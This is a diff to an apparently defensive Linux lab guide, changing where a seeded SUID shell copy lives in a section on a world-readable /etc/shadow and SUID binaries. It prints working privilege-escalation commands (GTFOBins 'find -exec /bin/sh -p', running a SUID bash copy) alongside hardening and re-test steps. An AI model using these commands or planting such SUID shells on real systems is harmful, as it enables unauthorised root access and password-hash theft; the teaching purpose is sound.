@@ -147,17 +147,17 @@ export IP=192.168.56.20                              # <-- the victim's IP (ip a
   *Permission denied*, because AppArmor (MAC) denies the read; `sudo aa-status` lists Apache in
   **enforce** mode. The web bug still exists, but its blast radius is contained.
 
-## 6. `/etc/shadow` world-readable; SUID on `find` and `/tmp/rootbash`
-- 🧪 **Seeded:** `chmod 644 /etc/shadow`; SUID bit on `/usr/bin/find`; a SUID copy at `/tmp/rootbash`.
+## 6. `/etc/shadow` world-readable; SUID on `find` and `/usr/local/bin/rootbash`
+- 🧪 **Seeded:** `chmod 644 /etc/shadow`; SUID bit on `/usr/bin/find`; a SUID copy at `/usr/local/bin/rootbash`.
 - 🟠 **Exploit (as the low-priv `trainee`):**
   ```bash
   ls -l /etc/shadow                       # => -rw-r--r-- : readable by everyone (feeds row 3)
-  find / -perm -4000 -type f 2>/dev/null  # => lists /usr/bin/find and /tmp/rootbash
+  find / -perm -4000 -type f 2>/dev/null  # => lists /usr/bin/find and /usr/local/bin/rootbash
   find . -exec /bin/sh -p \; -quit        # GTFOBins: drops a shell with euid=0
   id                                       # => uid=1001(trainee) euid=0(root)
-  /tmp/rootbash -p                        # second vector: also euid=0
+  /usr/local/bin/rootbash -p                        # second vector: also euid=0
   ```
-- 🟢 **Harden:** `chmod 640 /etc/shadow`; `chmod u-s /usr/bin/find`; `rm -f /tmp/rootbash`; audit the
+- 🟢 **Harden:** `chmod 640 /etc/shadow`; `chmod u-s /usr/bin/find`; `rm -f /usr/local/bin/rootbash`; audit the
   whole system with `find / -perm -4000 -type f 2>/dev/null`.
 - ✅ **Re-test:** `cat /etc/shadow` as `trainee` → *Permission denied*; `find … -exec` keeps `trainee`'s uid.
 
